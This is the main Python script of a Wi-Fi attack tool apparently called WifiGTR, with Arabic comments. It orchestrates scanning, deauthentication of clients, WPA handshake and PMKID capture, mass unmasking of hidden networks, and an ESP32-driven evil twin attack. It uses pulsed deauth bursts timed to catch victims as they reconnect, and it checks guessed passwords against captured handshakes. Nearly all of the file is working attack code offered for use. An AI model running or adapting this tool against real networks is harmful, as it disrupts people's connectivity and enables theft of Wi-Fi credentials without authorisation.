#!/usr/bin/env python3
import sys
import time
import os
import signal
import threading
from scapy.all import sniff

# Import Modules
from config import *
import utils
import ui
import cracker 
from database import DatabaseHandler
from scanner import NetworkScanner
from attacker import NetworkAttacker
from client_recon import ClientMonitor

# Import ESP32 & Evil Twin Modules
try:
    from esp_driver import ESP32Driver
    from eviltwin import EvilTwinAttack
except ImportError:
    # لن نوقف البرنامج إذا لم نجد الملفات، فقط سنعطل الميزات
    ESP32Driver = None
    EvilTwinAttack = None

class WifiGTR:
    def __init__(self, interface, serial_port=None):
        self.original_interface = interface
        self.interface = interface
        self.serial_port = serial_port
        self.db = DatabaseHandler()
        
        utils.check_root()
        utils.check_interface_exists(self.interface)
        
        self.scanner = None
        self.display_list = []
        self.esp_driver = None 
        
    def start(self):
        # 1. تفعيل وضع المراقبة
        self.interface = utils.enable_monitor_mode(self.interface)
        os.system(f"ip link set {self.interface} up")
        
        # 2. محاولة الاتصال بالـ ESP32 (فقط إذا تم تمرير المنفذ)
        if self.serial_port:
            if ESP32Driver:
                print(f"{C_CYAN}[*] Connecting to ESP32 on port {self.serial_port}...{C_RESET}")
                self.esp_driver = ESP32Driver(self.serial_port)
                
                if self.esp_driver.connect():
                    print(f"{C_GREEN}[+] ESP32 Connected Successfully.{C_RESET}")
                else:
                    print(f"{C_RED}[!] Failed to connect to ESP32. Running in Standalone Mode.{C_RESET}")
                    self.esp_driver = None
                    time.sleep(1)
            else:
                print(f"{C_RED}[!] ESP32 Modules missing. Running in Standalone Mode.{C_RESET}")
        else:
            print(f"{C_YELLOW}[*] No Serial Port provided. Running in Standalone Mode (No ESP32 features).{C_RESET}")

        # 3. بدء الماسح
        self.scanner = NetworkScanner(self.interface, self.db)
        self.main_loop()

    def main_loop(self):
        while True:
            try:
                ui.print_main_menu(self.interface)
                
                # عرض حالة الاتصال بالبورد
                if self.esp_driver and self.esp_driver.is_connected:
                    esp_status = f"{C_GREEN}Connected ({self.serial_port}){C_RESET}"
                else:
                    esp_status = f"{C_GREY}Not Connected{C_RESET}"
                
                print(f"    ESP32 Status: {esp_status}")
                print("--------------------------------------------------")
                
                choice = input(f"{C_YELLOW}[?]{C_RESET} Select Option: ")
                
                if choice == '1':   # Scan
                    self.scan_workflow()
                elif choice == '2': # Client Monitor
                    if not self.scanner: 
                        print(f"{C_RED}[!] Error: Scanner not initialized.{C_RESET}")
                        continue
                    monitor = ClientMonitor(self.scanner)
                    monitor.start()
                    input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")
                elif choice == '3': # Mass Attack
                    self.run_mass_attack()
                elif choice == '4': # Database
                    self.database_workflow()
                elif choice == '5': # About
                    ui.clear_screen()
                    print(f"{C_CYAN}--- ABOUT {APP_NAME} ---{C_RESET}")
                    input("Press Enter...")
                elif choice == '0':
                    self.cleanup()
                    sys.exit()
            except KeyboardInterrupt:
                self.cleanup()
                sys.exit()

    def cleanup(self):
        print(f"\n{C_YELLOW}[*] Shutting down...{C_RESET}")
        
        # إيقاف الـ ESP32 بشكل صحيح
        if self.esp_driver and self.esp_driver.is_connected:
            print(f"{C_RED}[*] Sending STOP command to ESP32...{C_RESET}")
            self.esp_driver.stop_all() # إرسال أمر التوقف
            time.sleep(0.5)            # انتظار مهم جداً لضمان وصول الأمر
            self.esp_driver.close()    # إغلاق الاتصال
            print(f"{C_GREEN}[+] ESP32 Stopped.{C_RESET}")
            
        # utils.restore_managed_mode(self.interface) # (معطل حسب طلبك السابق)
        print(f"{C_YELLOW}[*] Exiting.{C_RESET}")

    def scan_workflow(self):
        os.system(f"ip link set {self.interface} up 2>/dev/null")
        
        self.run_scanner_process()
        
        if not self.display_list:
            input("No networks found. Press Enter...")
            return

        target = self.select_target_from_list()
        if not target: return 

        bssid, channel = target
        net_info = self.scanner.networks[bssid]
        ssid_name = net_info['SSID']
        client_count = len(net_info.get('Clients', []))

        while True:
            ui.print_target_menu(ssid_name, bssid, channel, client_count)
            
            # عرض خيار Evil Twin بناءً على حالة الاتصال
            if self.esp_driver and self.esp_driver.is_connected:
                print(f"[{C_RED}6{C_RESET}] 😈 Evil Twin Attack (ESP32 Ready)")
            else:
                print(f"[{C_GREY}6{C_RESET}] {C_GREY}😈 Evil Twin Attack (Unavailable - No ESP32){C_RESET}")
            
            print("-" * 25)

            op = input(f"{C_YELLOW}[?]{C_RESET} Select Action: ")

            if op == '1': # Handshake
                self.run_attack((bssid, channel), mode="handshake")
            elif op == '2': # Reveal
                self.run_attack((bssid, channel), mode="reveal")
            elif op == '3': # Deauth
                self.run_attack((bssid, channel), mode="deauth_only")
            elif op == '4': # Passive
                self.run_attack((bssid, channel), mode="passive")
            elif op == '5': # PMKID Attack
                self.run_attack((bssid, channel), mode="pmkid")
            elif op == '6': # Evil Twin Logic
                if self.esp_driver and self.esp_driver.is_connected:
                    self.run_eviltwin_workflow(bssid, channel, ssid_name)
                else:
                    print(f"{C_RED}[!] ESP32 is not connected. Please restart tool with serial port.{C_RESET}")
                    time.sleep(1)
            elif op == '0':
                break

    def run_eviltwin_workflow(self, bssid, channel, ssid):
        if not self.esp_driver or not self.esp_driver.is_connected:
            print(f"\n{C_RED}[!] Error: ESP32 connection lost.{C_RESET}")
            return

        print(f"\n{C_CYAN}[*] Checking for existing Handshake...{C_RESET}")
        info = self.db.get_info(bssid)
        
        has_handshake = False
        if info and info.get('Handshake'):
            if info.get('HSFile') and os.path.exists(info['HSFile']):
                has_handshake = True
        
        if not has_handshake:
            print(f"{C_YELLOW}[!] No handshake found for {ssid}. Starting Capture Attack first...{C_RESET}")
            time.sleep(1)
            
            # 1. تشغيل الهجوم (الذي سيكشف الاسم ويجيب الهاند شيك)
            self.run_attack((bssid, channel), mode="handshake")
            
            # 2. تحديث المعلومات من قاعدة البيانات بعد الهجوم
            info = self.db.get_info(bssid)
            
            # [تصحيح] تحديث اسم الشبكة إذا تم كشفه
            if info and info.get('SSID') and info['SSID'] != "<HIDDEN>":
                ssid = info['SSID']
                print(f"{C_GREEN}[+] Target Decloaked: {ssid}{C_RESET}")

            # التحقق من الهاند شيك مرة أخرى
            if info and info.get('Handshake') and os.path.exists(info.get('HSFile', '')):
                print(f"{C_GREEN}[+] Handshake captured successfully.{C_RESET}")
                time.sleep(1)
            else:
                print(f"{C_RED}[-] Failed to capture handshake. Cannot start Evil Twin.{C_RESET}")
                input("Press Enter...")
                return
        else:
            print(f"{C_GREEN}[+] Found valid handshake: {info['HSFile']}{C_RESET}")
            # تحديث الاسم أيضاً في حالة كان مخفياً سابقاً وتم كشفه الآن
            if info and info.get('SSID') and info['SSID'] != "<HIDDEN>":
                ssid = info['SSID']

        print(f"{C_CYAN}[*] Proceeding to Evil Twin with SSID: {ssid}{C_RESET}")

        if EvilTwinAttack:
            # نمرر الاسم المحدث (ssid) هنا
            et_attack = EvilTwinAttack(self.esp_driver, self.db, bssid, channel, ssid)
            et_attack.run()
        else:
            print(f"{C_RED}[!] Error: EvilTwin module not loaded.{C_RESET}")
        
        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")

    def run_scanner_process(self):
        self.scanner.stop_sniffing = False
        def signal_handler(sig, frame): self.scanner.stop_sniffing = True
        original_sigint = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, signal_handler)

        hopper = threading.Thread(target=self.scanner.channel_hopper, daemon=True)
        hopper.start()

        try:
            last_print = 0
            while not self.scanner.stop_sniffing:
                try:
                    sniff(iface=self.interface, prn=self.scanner.packet_handler, count=0, timeout=0.1, store=0)
                except OSError:
                    os.system(f"ip link set {self.interface} up 2>/dev/null")
                    continue

                if time.time() - last_print > 0.5:
                    self.display_list = ui.print_scan_table(self.interface, self.scanner.networks, self.scanner.lock)
                    last_print = time.time()
        except KeyboardInterrupt:
            self.scanner.stop_sniffing = True
        
        signal.signal(signal.SIGINT, original_sigint)
        print(f"\n{C_YELLOW}[!] Scan Stopped.{C_RESET}")

    def select_target_from_list(self):
        while True:
            try:
                choice = input(f"\n[?] Select Network ID (Enter to cancel): ")
                if choice == "": return None
                idx = int(choice)
                if 0 <= idx < len(self.display_list):
                    bssid = self.display_list[idx]
                    channel = self.scanner.networks[bssid]['Channel']
                    print(f"\n{C_GREEN}[+] Target Selected: {bssid} (CH: {channel}){C_RESET}")
                    os.system(f"iwconfig {self.interface} channel {channel}")
                    return (bssid, channel)
                else:
                    print(f"{C_RED}[!] Invalid ID.{C_RESET}")
            except ValueError:
                print(f"{C_RED}[!] Please enter a number.{C_RESET}")

    def run_mass_attack(self):
        if not self.display_list:
            print(f"{C_RED}[!] You must Scan first to populate targets.{C_RESET}")
            self.run_scanner_process()
            
        hidden_targets = []
        for bssid in self.display_list:
            net = self.scanner.networks[bssid]
            if net['Hidden'] and not net['Known']: 
                hidden_targets.append((bssid, net['Channel']))
        
        if not hidden_targets:
            print(f"{C_RED}[-] No unknown hidden networks found.{C_RESET}")
            input("Press Enter...")
            return

        print(f"\n{C_CYAN}[*] Found {len(hidden_targets)} hidden networks.{C_RESET}")
        try: duration = int(input(f"[?] Duration per network (seconds, default 30): ") or 30)
        except: duration = 30
            
        print(f"{C_YELLOW}[*] Starting Mass Attack... (Ctrl+C to Skip current){C_RESET}")
        
        results_count = 0
        for i, (bssid, channel) in enumerate(hidden_targets):
            print(f"\n{C_WHITE}--- Target {i+1}/{len(hidden_targets)}: {bssid} ---{C_RESET}")
            os.system(f"iwconfig {self.interface} channel {channel}")
            
            # في الهجوم الشامل نستخدم كارت اللابتوب فقط للسرعة
            attacker = NetworkAttacker(
                interface=self.interface,
                target_bssid=bssid,
                target_channel=channel,
                db_handler=self.db,
                attack_mode="reveal"
            )
            
            def skip_handler(sig, frame): attacker.stop_attack = True 
            original_sigint = signal.getsignal(signal.SIGINT)
            signal.signal(signal.SIGINT, skip_handler)
            
            attacker.start_deauth_thread()
            
            start_time = time.time()
            while not attacker.success and not attacker.stop_attack:
                if time.time() - start_time > duration: break 
                try:
                    sniff(iface=self.interface, prn=attacker.sniffer_callback, count=0, timeout=0.5, store=0)
                except OSError:
                    os.system(f"ip link set {self.interface} up 2>/dev/null")

            signal.signal(signal.SIGINT, original_sigint)
            attacker.stop_attack = True 

            if attacker.success and attacker.result_data:
                self.db.save(bssid, attacker.result_data['SSID'])
                print(f"\n{C_GREEN}[+] SUCCESS: {bssid} -> {attacker.result_data['SSID']}{C_RESET}")
                results_count += 1
        
        print(f"\n{C_CYAN}=== Mass Attack Finished. Revealed: {results_count} ==={C_RESET}")
        input("Press Enter...")

    def run_attack(self, target, mode="reveal"):
        bssid, channel = target
        current_ssid = self.scanner.networks[bssid]['SSID']
        if current_ssid == "<HIDDEN>": current_ssid = "Unknown"
        
        # إعداد الكارت
        os.system(f"ip link set {self.interface} up 2>/dev/null")
        os.system(f"iwconfig {self.interface} channel {channel}")

        attacker = NetworkAttacker(
            interface=self.interface, 
            target_bssid=bssid, 
            target_channel=channel, 
            db_handler=self.db, 
            attack_mode=mode, 
            target_ssid=current_ssid
        )
        
        msg = f"Mode: {mode.upper()}"
        print(f"{C_RED}[*] Starting: {msg} (Ctrl+C to Stop)...{C_RESET}")
        
        def signal_handler(sig, frame): attacker.stop_attack = True
        original_sigint = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, signal_handler)

        attacker.start_deauth_thread()

        # التحقق من وجود الـ ESP32
        esp_active = False
        if self.esp_driver and self.esp_driver.is_connected:
            if mode != "passive":
                print(f"{C_YELLOW}[+] ESP32 Detected: Using 'Burst' Attack Mode.{C_RESET}")
                esp_active = True

        loop_count = 0 
        last_esp_attack = 0 # توقيت آخر هجوم

        while not attacker.success and not attacker.stop_attack:
            if mode == "handshake" and attacker.handshake_captured: break
            if mode == "pmkid" and attacker.pmkid_captured: break
            
            current_time = time.time()
            loop_count += 1 
            status = "Listening" if mode == "passive" else "Attacking"
            
            # --- منطق الهجوم بالنبضات (Pulsed Attack) ---
            # نرسل هجوم لمدة 2 ثانية كل 5 ثواني
            # هذا يعطي فرصة 3 ثواني للضحية ليعيد الاتصال فنصطاده
            if esp_active and mode != "passive":
                if current_time - last_esp_attack > 5: # كل 5 ثواني
                    # أرسل أمر هجوم لمدة 2 ثانية فقط
                    self.esp_driver.start_attack(bssid, channel, duration=2)
                    last_esp_attack = current_time

            clients_str = f"{len(attacker.clients)} Clients"
            ssid_display = attacker.target_ssid if attacker.target_ssid != "Unknown" else ""
            if ssid_display: ssid_display = f"({C_GREEN}{ssid_display}{C_RESET}) "

            # عرض الحالة
            dual_msg = f" {C_RED}+ ESP32{C_RESET}" if esp_active else ""
            alert_msg = ""
            if attacker.handshake_captured: alert_msg = f" {C_GREEN}[HANDSHAKE!]{C_RESET}"
            elif attacker.pmkid_captured: alert_msg = f" {C_GREEN}[PMKID!]{C_RESET}"

            sys.stdout.write(f"\r\033[K[{loop_count}] [*] {status}{dual_msg}{alert_msg} {ssid_display}> {clients_str}")
            sys.stdout.flush()
            
            try:
                sniff(iface=self.interface, prn=attacker.sniffer_callback, count=0, timeout=0.2, store=0)
            except OSError:
                os.system(f"ip link set {self.interface} up 2>/dev/null")

        signal.signal(signal.SIGINT, original_sigint)
        attacker.stop_attack = True
        
        if esp_active:
            self.esp_driver.stop_all()

        if attacker.handshake_captured or attacker.pmkid_captured:
            final_ssid = attacker.target_ssid
            if final_ssid != "Unknown":
                self.db.save(bssid, final_ssid)
            
            f_type = "PMKID" if attacker.pmkid_captured else "Handshake"
            self.db.update_handshake(bssid, True, utils.get_current_time_12h(), filename=attacker.handshake_filename)
            
            print(f"\n{C_CYAN}[+] {f_type} Captured!{C_RESET}")
            print(f"{C_WHITE}    Saved to: {attacker.handshake_filename}{C_RESET}")

        if mode == "reveal" and attacker.success:
            self.db.save(bssid, attacker.result_data['SSID'])
            ui.print_attack_summary(attacker.result_data)
        else:
            print("\n[!] Attack Finished/Stopped.")
            input("Press Enter...")

    def database_workflow(self):
        while True:
            ui.print_database_menu()
            op = input(f"{C_YELLOW}[?]{C_RESET} Select Action: ")
            if op == '1':
                ui.show_saved_db(self.db)
                input("Press Enter...")
            elif op == '2':
                self.verify_password_logic()
            elif op == '0':
                break

    def verify_password_logic(self):
        saved_list = ui.show_saved_db(self.db)
        if not saved_list:
            input("Press Enter...")
            return
        choice = input(f"{C_YELLOW}[?]{C_RESET} Enter Network ID to verify: ")
        if choice.isdigit():
            idx = int(choice)
            if 0 <= idx < len(saved_list):
                bssid = saved_list[idx]
                data = self.db.get_info(bssid)
                pcap = data.get('HSFile', '')
                if not pcap or not os.path.exists(pcap):
                    print(f"{C_RED}[-] File missing.{C_RESET}")
                    input("Enter...")
                    return
                pwd = input(f"[?] Password for {data['SSID']}: ")
                if cracker.verify_password(pcap, bssid, data['SSID'], pwd):
                    print(f"\n{C_GREEN}[SUCCESS] Correct Password!{C_RESET}")
                else:
                    print(f"\n{C_RED}[FAILURE] Incorrect.{C_RESET}")
                input("Enter...")

if __name__ == "__main__":
    # تعديل منطق التشغيل ليقبل argument واحد أو اثنين
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print(f"{C_YELLOW}Usage:{C_RESET} sudo python3 main.py <interface> [serial_port]")
        print(f"{C_YELLOW}Ex 1 (Standalone):{C_RESET} sudo python3 main.py wlan0")
        print(f"{C_YELLOW}Ex 2 (With ESP32):{C_RESET} sudo python3 main.py wlan0 /dev/ttyUSB0")
        sys.exit(1)
    
    # إذا أدخل 3 مدخلات، الثاني هو المنفذ، وإلا فهو None
    port = sys.argv[2] if len(sys.argv) == 3 else None
    
    app = WifiGTR(sys.argv[1], port)
    try:
        app.start()
    except KeyboardInterrupt:
        print("\n[!] Bye.")